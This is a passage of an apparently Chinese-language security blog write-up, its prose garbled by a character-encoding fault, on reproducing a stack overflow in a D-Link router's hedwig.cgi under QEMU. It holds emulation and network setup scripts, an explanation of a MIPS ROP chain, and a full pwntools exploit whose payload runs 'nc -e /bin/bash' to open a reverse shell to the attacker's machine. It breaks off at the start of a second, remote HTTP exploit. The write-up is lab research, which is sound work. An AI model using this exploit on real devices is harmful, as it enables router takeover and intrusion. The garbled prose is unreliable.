-c</code>ç”¨æ¥æ¥æ”¶ä¸Šä¸€ä¸ªechoå‘½ä»¤ä¸­æ¥æ”¶åˆ°çš„å­—ç¬¦æ•°ï¼Œæ‰€ä»¥å˜é‡<code>LEN</code>æ˜¯è®¡ç®—å˜é‡<code>INPUT</code>çš„é•¿åº¦</p><p><code>echo $INPUT | qemu-mipsel ...</code>ç«‹åˆ»è¾“å‡ºè¿”å›çš„ä¿¡æ¯</p><ul><li><code>-L</code>ï¼šè®¾ç½®ELFæ–‡ä»¶è¿è¡Œç›®å½• </li><li><code>-0</code>ï¼šå¼ºåˆ¶æ›´æ”¹ç›®æ ‡è¿›ç¨‹çš„<code>argv[0]</code>ï¼ˆ<code>argv[0]</code>å­˜å‚¨ç€ç¨‹åºçš„åç§°ï¼‰</li><li><code>-E</code>ï¼šè®¾ç½®ç¯å¢ƒå˜é‡ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡ï¼š<ul><li><code>REQUEST_METHOD</code>ï¼šæŒ‡å®šä¸º<code>POST</code></li><li><code>CONTENT_LENGTH</code>ï¼šå‘é€æ•°æ®çš„é•¿åº¦ï¼Œè¿™ä¸ªéœ€è¦æˆ‘ä»¬ä¼ å…¥</li><li><code>CONTENT_TYPE</code>ï¼šé€šå¸¸ä¸º<code>application/x-www-form-urlencoded</code>ï¼Œæ„æ€æ˜¯æ˜¯è¡¨å•</li><li><code>HTTP_COOKIE</code>ï¼šå‘é€çš„cookieå€¼ï¼Œè¿™ä¸ªéœ€è¦æˆ‘ä»¬ä¼ å…¥ï¼Œä¹Ÿæ˜¯æ ˆæº¢å‡ºå‘ç”Ÿçš„ä½ç½®</li><li><code>REQUEST_URI</code>ï¼šå½“å‰è¯·æ±‚çš„åŸå§‹URLï¼Œè¿™ä¸ªéšä¾¿</li></ul></li><li><code>-g</code>ï¼šç­‰å¾…gdbè¿æ¥åˆ°ç«¯å£</li></ul><h2 id="qemu-ç³»ç»Ÿæ¨¡å¼å¤ç°"><a href="#qemu-ç³»ç»Ÿæ¨¡å¼å¤ç°" class="headerlink" title="qemu ç³»ç»Ÿæ¨¡å¼å¤ç°"></a>qemu ç³»ç»Ÿæ¨¡å¼å¤ç°</h2><p>ç”¨qemuçš„ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿçš„ç¯å¢ƒæ¯”èµ·ç”¨qemuçš„ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿçš„ç¯å¢ƒè¦æ›´åŠ çœŸå®</p><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>äº‹å…ˆå®‰è£…ä¾èµ–åº“</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> bridge-utils uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-å¯åŠ¨qemu"><a href="#1-å¯åŠ¨qemu" class="headerlink" title="1.å¯åŠ¨qemu"></a>1.å¯åŠ¨qemu</h4><p>è¦ä½¿ç”¨qemu-system-mipselä»ç³»ç»Ÿè§’åº¦è¿›è¡Œæ¨¡æ‹Ÿï¼Œå°±éœ€è¦mipsæ¶æ„çš„å†…æ ¸é•œåƒå’Œæ–‡ä»¶ç³»ç»Ÿã€‚å¯ä»¥åœ¨å¦‚ä¸‹ç½‘ç«™ä¸‹è½½ï¼š<a href="https://people.debian.org/~aurel32/qemu/">Index of &#x2F;~aurel32&#x2F;qemu (debian.org)</a></p><p>æˆ‘ä»¬éœ€è¦çš„æ˜¯å°ç«¯åºï¼Œé€‰æ‹©mipselï¼Œä¸‹è½½æ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸é•œåƒï¼š<br><img src="/RW_FILE/3ddb1fd9dbc3f379fdb36cd1188dfb80_MD5.jpeg"></p><p>é…ç½®qemuå¯åŠ¨è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><div class="caption"><span>TI:"start.sh"</span></div><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">sudo</span> qemu-system-mipsel <span class="token punctuation">\</span><span class="token parameter variable">-kernel</span> ~/Public/mipsel/vmlinux-3.2.0-4-4kc-malta <span class="token punctuation">\</span><span class="token parameter variable">-hda</span> ~/Public/mipsel/debian_squeeze_mipsel_standard.qcow2 <span class="token punctuation">\</span><span class="token parameter variable">-append</span> <span class="token string">"root=/dev/sda1 console=ttyS0"</span> <span class="token punctuation">\</span><span class="token parameter variable">-net</span> nic <span class="token punctuation">\</span><span class="token parameter variable">-net</span> tap <span class="token punctuation">\</span><span class="token parameter variable">-nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥ä½¿ç”¨<code>user:user</code>æˆ–<code>root:root</code>ç™»å½•ï¼Œè¦é€€å‡ºqemuæ¨¡æ‹Ÿï¼Œåˆ™ä½¿ç”¨å¿«æ·é”®<code>ctrl+a</code>å†æŒ‰<code>x</code></p><h4 id="2-å®ç°qemuè™šæœº-å®¿ä¸»æœºç½‘ç»œäº’é€š"><a href="#2-å®ç°qemuè™šæœº-å®¿ä¸»æœºç½‘ç»œäº’é€š" class="headerlink" title="2.å®ç°qemuè™šæœº&amp;å®¿ä¸»æœºç½‘ç»œäº’é€š"></a>2.å®ç°qemuè™šæœº&amp;å®¿ä¸»æœºç½‘ç»œäº’é€š</h4><p>åœ¨ä¸»æœºåˆ›å»ºä¸€ä¸ª<code>net.sh</code>è„šæœ¬ï¼Œç”¨æ¥åˆ›å»ºè™šæ‹ŸTapæ¥å£ï¼Œipä¸º 192.168.100.1&#x2F;24</p><pre class="line-numbers language-bash" data-language="bash"><div class="caption"><span>TI:"net.sh"</span></div><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.ip_forward</span><span class="token operator">=</span><span class="token number">1</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-X</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-X</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-F</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-X</span><span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> INPUT ACCEPT<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> FORWARD ACCEPT<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> OUTPUT ACCEPT<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-A</span> POSTROUTING <span class="token parameter variable">-o</span> ens33 <span class="token parameter variable">-j</span> MASQUERADE<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-i</span> tap0 <span class="token parameter variable">-j</span> ACCEPT<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-o</span> tap0 <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> RELATED,ESTABLISHED <span class="token parameter variable">-j</span> ACCEPT<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">192.168</span>.100.1/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨qemuæœºé…ç½®è™šæ‹Ÿç½‘å¡ï¼Œipä¸º 192.168.100.2&#x2F;24</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.100.2/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-äº‹å‰é…ç½®"><a href="#3-äº‹å‰é…ç½®" class="headerlink" title="3.äº‹å‰é…ç½®"></a>3.äº‹å‰é…ç½®</h4><p>åœ¨æŠŠæ–‡ä»¶ç³»ç»Ÿå¤åˆ¶åˆ°qemuè™šæœºä¹‹å‰ï¼Œéœ€è¦åœ¨squashfs-root&#x2F;ä¸‹å‡†å¤‡ä¸€äº›ä¸œè¥¿ï¼š</p><ol><li><p>gdbserver-mipsel<br>å¯ä»¥åœ¨ <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver">embedded-tools&#x2F;binaries&#x2F;gdbserver at master Â· rapid7&#x2F;embedded-tools (github.com)</a> ä¸‹è½½æ‰€éœ€æ¶æ„çš„gdbserver</p></li><li><p>init.sh &amp; fin.sh<br>åˆ›å»º<code>init.sh</code>çš„è„šæœ¬è¿›è¡Œåˆå§‹åŒ–æ“ä½œï¼š</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><div class="caption"><span>TI:"init.sh"</span></div><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space<span class="token function">cp</span> http_conf /<span class="token function">cp</span> sbin/httpd /<span class="token function">cp</span> <span class="token parameter variable">-rf</span> htdocs/ /<span class="token function">mkdir</span> /etc_bak<span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc /etc_bak<span class="token function">rm</span> /etc/services<span class="token function">cp</span> <span class="token parameter variable">-rf</span> etc/ /<span class="token function">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/<span class="token function">cp</span> lib/libcrypt-0.9.30.1.so  /lib/<span class="token function">cp</span> lib/libc.so.0  /lib/<span class="token function">cp</span> lib/libgcc_s.so.1  /lib/<span class="token function">cp</span> lib/ld-uClibc.so.0  /lib/<span class="token function">cp</span> lib/libcrypt.so.0  /lib/<span class="token function">cp</span> lib/libgcc_s.so  /lib/<span class="token function">cp</span> lib/libuClibc-0.9.30.1.so  /lib/<span class="token builtin class-name">cd</span> /<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /htdocs/web/hedwig.cgi<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/phpcgi<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/hnap<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /htdocs/web/hedwig.cgi<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /usr/sbin/phpcgi<span class="token function">ln</span> <span class="token parameter variable">-s</span>  /htdocs/cgibin /usr/sbin/hnap./httpd <span class="token parameter variable">-f</span> ./http_conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œ<code>init.sh</code>è„šæœ¬ä¸»è¦å°±æ˜¯å°†ä¸€äº›è¦ç”¨çš„æ–‡ä»¶ä»æˆ‘ä»¬è§£å‹å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿæ‹·è´åˆ°ä¸‹è½½çš„é•œåƒæ–‡ä»¶çš„æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚è™½ç„¶å¯ä»¥ç”¨<code>chroot</code>ç›´æ¥æ”¹æ ¹ç›®å½•ï¼Œä½†æ˜¯åé¢ä¸ä»…éœ€è¦æŒ‚è½½devå’Œprocç›®å½•ï¼Œè¿˜æœ‰å…¶ä»–é—®é¢˜æ¯”å¦‚æ²¡æœ‰PIDæ–‡ä»¶ç­‰ï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚ä¸å¦‚ç›´æ¥å¤åˆ¶åˆ°æ ¹ç›®å½•ä¸‹ã€‚</p><p>å› ä¸ºçœŸæœºæ²¡å¼€ASLRï¼Œè¿™é‡Œä¹Ÿç›´æ¥å…³é—­æ‰ã€‚</p><p>å½“ç„¶ï¼Œåœ¨é€€å‡ºqemuè™šæ‹Ÿæœºæ—¶ï¼Œéœ€è¦æ¢å¤&#x2F;etcæ–‡ä»¶å¤¹ï¼Œä¸ç„¶å†æ¬¡å¯åŠ¨qemuæ—¶ä¼šå¤±è´¥ï¼ŒåŸå› æ˜¯å› ä¸ºæ”¹å˜äº†æ–‡ä»¶ç³»ç»Ÿçš„å†…å®¹ã€‚æ­¤æ—¶å°±åªèƒ½ä½¿ç”¨æ–°çš„æ–‡ä»¶ç³»ç»Ÿã€‚æ‰€ä»¥æˆ‘ä»¬é€€å‡ºæ—¶è®°å¾—è¿è¡Œ<code>fin.sh</code>çš„è„šæœ¬æ¢å¤<code>/etc</code>æ–‡ä»¶å¤¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><div class="caption"><span>TI:"fin.sh"</span></div><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc<span class="token function">mv</span> /etc_bak/ /etc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>http_conf<blockquote><p>httpd.conf æ˜¯ Apache HTTP Server çš„ä¸»é…ç½®æ–‡ä»¶ï¼Œç”¨äºå®šä¹‰å…¨å±€æ€§è´¨çš„é…ç½®é¡¹ï¼ŒåŒ…æ‹¬æ—¥å¿—ã€è¿æ¥æ± å¤§å°ç­‰ã€‚</p></blockquote></li></ol><p>æˆ‘ä»¬åœ¨squashfs-root&#x2F;ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸º<code>http_conf</code>çš„æ–‡ä»¶</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">Umask 026PidFile /var/run/httpd.pidLogGMT On  #å¼€å¯logErrorLog /log #logæ–‡ä»¶ Tuning&#123;    NumConnections 15    BufSize 12288    InputBufSize 4096    ScriptBufSize 4096    NumHeaders 100    Timeout 60    ScriptTimeout 60&#125; Control&#123;    Types    &#123;        text/html    &#123; html htm &#125;        text/xml    &#123; xml &#125;        text/plain    &#123; txt &#125;        image/gif    &#123; gif &#125;        image/jpeg    &#123; jpg &#125;        text/css    &#123; css &#125;        application/octet-stream &#123; * &#125;    &#125;    Specials    &#123;        Dump        &#123; /dump &#125;        CGI            &#123; cgi &#125;        Imagemap    &#123; map &#125;        Redirect    &#123; url &#125;    &#125;    External    &#123;        /usr/sbin/phpcgi &#123; php &#125;    &#125;&#125;  Server&#123;    ServerName "Linux, HTTP/1.1, "    ServerId "8080"    Family inet    Interface eth0 #å¯¹åº”qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„ç½‘å¡    Address 192.168.100.2 #qemuä»¿çœŸè·¯ç”±å™¨ç³»ç»Ÿçš„IP    Port "8888" #å¯¹åº”æœªè¢«ä½¿ç”¨çš„ç«¯å£    Virtual    &#123;        AnyHost        Control        &#123;            Alias /            Location /htdocs/web            IndexNames &#123; index.php &#125;            External            &#123;                /usr/sbin/phpcgi &#123; router_info.xml &#125;                /usr/sbin/phpcgi &#123; post_login.xml &#125;            &#125;        &#125;        Control        &#123;            Alias /HNAP1            Location /htdocs/HNAP1            External            &#123;                /usr/sbin/hnap &#123; hnap &#125;            &#125;            IndexNames &#123; index.hnap &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-å¯åŠ¨httpdæœåŠ¡"><a href="#4-å¯åŠ¨httpdæœåŠ¡" class="headerlink" title="4.å¯åŠ¨httpdæœåŠ¡"></a>4.å¯åŠ¨httpdæœåŠ¡</h4><p>ä¸€åˆ‡å°±ç»ªï¼Œå°†æ–‡ä»¶ç³»ç»Ÿä¸Šä¼ åˆ°è™šæœº</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-r</span> squashfs-root/ root@192.168.100.2:~/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è½¬åˆ°æ ¹ç›®å½•ï¼Œæ‰§è¡Œ<code>init.sh</code>å¯åŠ¨httpdæœåŠ¡ï¼š<br><img src="/RW_FILE/c0cad212c28242263b7827b296f232d9_MD5.jpeg"></p><p>è¿è¡Œ<code>hedwig.cgi</code>ï¼Œå‡ºç°no requesté—®é¢˜ï¼š<br><img src="/RW_FILE/8013e7a5a2b47025c6da47122d812c16_MD5.jpeg"><br>è¿™é‡Œè®¿é—®å¤±è´¥æ˜¯å› ä¸ºhedwig.cgiæœåŠ¡æ²¡æœ‰æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦æå‰é…ç½®qemuè™šæ‹Ÿç¯å¢ƒä¸­çš„<code>REQUEST_METHOD</code>ç­‰æ–¹æ³•ï¼Œå› ä¸ºhttpdæ˜¯è¯»å–çš„ç¯å¢ƒå˜é‡ï¼Œè¿™é‡Œå°±ç›´æ¥é€šè¿‡ç¯å¢ƒå˜é‡è¿›è¡Œè®¾ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"100"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåœ¨qemuè™šæ‹Ÿç³»ç»Ÿä¸­è¿è¡Œhedwig.cgiï¼Œå†æ¬¡è®¿é—®ç½‘å€å°±èƒ½æ­£å¸¸æ”¶åˆ°å†…å®¹äº†<br><img src="/RW_FILE/54ce873fcc2979a58e8771149b52c3a5_MD5.jpeg"></p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="â‘ -å°†ç”Ÿæˆçš„payloadä¼ ç»™qemuæœºï¼ˆæœ¬åœ°ï¼‰"><a href="#â‘ -å°†ç”Ÿæˆçš„payloadä¼ ç»™qemuæœºï¼ˆæœ¬åœ°ï¼‰" class="headerlink" title="â‘  å°†ç”Ÿæˆçš„payloadä¼ ç»™qemuæœºï¼ˆæœ¬åœ°ï¼‰"></a>â‘  å°†ç”Ÿæˆçš„payloadä¼ ç»™qemuæœºï¼ˆæœ¬åœ°ï¼‰</h4><p>è¿™ç§æ–¹æ³•ä¸éœ€è¦å¼€å¯httpdï¼Œå°±æ˜¯æŠŠç”Ÿæˆçš„payloadä¼ ç»™qemuè™šæ‹Ÿæœºï¼Œç„¶ååœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡Œpayload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_LENGTH</span><span class="token operator">=</span><span class="token string">"11"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CONTENT_TYPE</span><span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_COOKIE</span><span class="token operator">=</span><span class="token string">"uid=<span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> payload<span class="token variable">`</span></span>"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_METHOD</span><span class="token operator">=</span><span class="token string">"POST"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">REQUEST_URI</span><span class="token operator">=</span><span class="token string">"2333"</span><span class="token builtin class-name">echo</span> <span class="token string">"X1NRI=pwner"</span><span class="token operator">|</span>./gdbserver.mipsel :1234 /htdocs/web/hedwig.cgi<span class="token comment">#echo "X1NRI=pwner"| /htdocs/web/hedwig.cgi</span><span class="token builtin class-name">unset</span> CONTENT_LENGTH<span class="token builtin class-name">unset</span> CONTENT_TYPE<span class="token builtin class-name">unset</span> HTTP_COOKIE<span class="token builtin class-name">unset</span> REQUEST_METHOD<span class="token builtin class-name">unset</span> REQUEST_URI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è°ƒè¯•çœ‹åˆ°libcçš„åŸºå€ï¼š<br><img src="/RW_FILE/df147182a42fb713e2dcc84e85975e02_MD5.jpeg"></p><p>åœ¨ä¸»å‡½æ•°æ ˆå›æº¯æ—¶æ±‡ç¼–å¦‚ä¸‹ï¼š<br><img src="/RW_FILE/f815e18799a272e461f24abdf9e3ab80_MD5.jpeg"><br>æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$s0~$s7ã€$fpã€$ra</code>å¯„å­˜å™¨çš„å€¼</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œsystemçš„åœ°å€ä¸º<code>0x00053200</code>ï¼Œå¦‚æœç›´æ¥å‘é€ä¼šä½¿sprintfå‡ºç°00æˆªæ–­ã€‚å¯¹ç­–æ˜¯å…ˆå°†Â <code>system</code>Â å‡½æ•°çš„åœ°å€ -1 ä¼ å…¥æŸä¸ªå¯„å­˜å™¨ä¸­ï¼Œä¹‹åæ‰¾åˆ°å¯¹è¿™ä¸ªå¯„å­˜å™¨è¿›è¡ŒåŠ  +1 çš„æ“ä½œçš„ gadget è¿›è¡Œè°ƒç”¨å³å¯å°†<code>system</code>åœ°å€æ¢å¤ã€‚</p><ul><li><p>å› æ­¤æˆ‘ä»¬æŸ¥æ‰¾<code>addiu $s0,1</code>ï¼Œé€‰æ‹©çš„æ˜¯0x158c8å¤„çš„gadget<br><img src="/RW_FILE/cbc5e859772b1658c068e486a0a08bed_MD5.jpeg"><br><img src="/RW_FILE/37271328256a76fab79605bcaf3488bd_MD5.jpeg"><br>è¿™ä¸ªgadgetä¼šå°†<code>$s0</code>+1ï¼Œå¹¶è·³è½¬åˆ°<code>$s5</code>ï¼šå¯ä»¥å°†<code>$s0</code>èµ‹å€¼ä¸ºsystem-1</p></li><li><p>åˆ©ç”¨mipsrop.stackfinder()ï¼ŒæŸ¥æ‰¾èƒ½å¤Ÿä¼ å‚çš„gadgetï¼Œé€‰æ‹©çš„æ˜¯0x159ccå¤„çš„gadget<br><img src="/RW_FILE/cfbfb5bfe277500ce078bebecb2d9473_MD5.jpeg"><br><img src="/RW_FILE/5805129b055fe40a24121f61d3662f0c_MD5.jpeg"><br>è¿™ä¸ªgadgetèƒ½å¤Ÿèµ‹å€¼<code>$a0</code>ä¸º<code>$sp+0x10</code>ï¼Œç„¶åè·³è½¬åˆ°<code>$s0</code></p></li></ul><p>expå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./squashfs-root/lib/libc.so.0'</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span><span class="token number">0x77f34000</span>system<span class="token operator">=</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gadget1<span class="token operator">=</span><span class="token number">0x158c8</span> <span class="token comment">#jalr s5; addiu s0,1</span>gadget2<span class="token operator">=</span><span class="token number">0x159cc</span> <span class="token comment">#addiu s5, sp, 0x10; jalr s0; move a0, s5</span>cmd<span class="token operator">=</span><span class="token string">b'nc -e /bin/bash 192.168.100.1 4321'</span>payload_header<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'/htdocs/webinc/fatlady.php\nprefix=/runtime/session/'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span>payload_header<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#s0</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s1  </span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s2</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s3</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s4</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadget2<span class="token punctuation">)</span><span class="token comment">#s5</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s6</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#s7</span>payload <span class="token operator">+=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token comment">#fp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span>gadget1<span class="token punctuation">)</span><span class="token comment">#ra</span>payload <span class="token operator">+=</span> <span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x10</span>payload <span class="token operator">+=</span> cmdfd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./payload'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'scp ./payload root@192.168.100.2:/root/squashfs-root '</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æœ¬åœ°ç›‘å¬4321ç«¯å£ï¼ŒæˆåŠŸåå¼¹shellï¼š<br><img src="/RW_FILE/6cd2b86aee472fc99d5720ed5b8c55c6_MD5.jpeg"></p><h4 id="â‘¡-è¿œç¨‹å‘é€httpæŠ¥æ–‡ï¼ˆè¿œç¨‹ï¼‰"><a href="#â‘¡-è¿œç¨‹å‘é€httpæŠ¥æ–‡ï¼ˆè¿œç¨‹ï¼‰" class="headerlink" title="â‘¡ è¿œç¨‹å‘é€httpæŠ¥æ–‡ï¼ˆè¿œç¨‹ï¼‰"></a>â‘¡ è¿œç¨‹å‘é€httpæŠ¥æ–‡ï¼ˆè¿œç¨‹ï¼‰</h4><p>æˆ‘ä»¬æ—¢ç„¶å¼€å¯äº†httpdæœåŠ¡ï¼Œå°±å¯ä»¥ç›´æ¥å‘é€æ•°æ®åŒ…</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token 